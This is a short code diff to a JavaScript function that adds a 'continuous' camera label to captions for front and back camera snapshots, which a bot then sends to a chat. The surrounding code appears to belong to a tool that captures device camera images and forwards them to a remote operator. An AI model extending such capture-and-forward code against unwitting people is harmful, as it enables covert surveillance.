@@ -1279,7 +1279,8 @@ function flushCamAlbum(tid) {
 
   if (snaps.length === 1) {
     const {buf,cam} = snaps[0];
-    const cap = (cam==="back"?"📷 خلفية":"🤳 أمامية") + ` | ${ts}`;
+    const camLabel = cam==="back"?"📷 خلفية":cam==="front-cont"?"🔄 مستمر":"🤳 أمامية";
+    const cap = camLabel + ` | ${ts}`;
     const info = { filename:"snap.png", contentType:"image/png" };
     if (!settings.silentMode) {
       bot.sendPhoto(tid, buf, { caption: cap }, info).catch(()=>{});
